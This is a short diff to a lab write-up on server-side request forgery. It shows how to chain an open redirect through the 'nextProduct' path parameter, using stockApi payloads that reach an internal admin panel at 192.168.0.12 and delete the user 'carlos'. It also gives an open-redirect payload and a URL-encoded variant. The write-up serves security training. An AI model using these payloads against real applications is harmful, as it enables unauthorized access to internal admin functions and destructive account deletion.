@@ -27,7 +27,13 @@ Analysis:
 *** stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
 
 
-NOTE: When we go to the nextProduct it shows the request like this: /product/nextProduct?currentProductId=2&path=/product?productId=3 and if we try openredirect there we can find it, we will found it by: 
+NOTE: 
+ 1. When we go to the nextProduct it shows the request like this: /product/nextProduct?currentProductId=2&path=/product?productId=3 and if we try openredirect there we can find it, we will found it by: 
 OPENREDIRECT PAYLOAD : /product/nextProduct?currentProductId=2&path=http://www.google.com 
+
+ 2. stockApi=/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin 
+     we can use this PAYLOAD too gain access the admin panel.
+
+
 
 HENCE WE SOLVED THE LAB
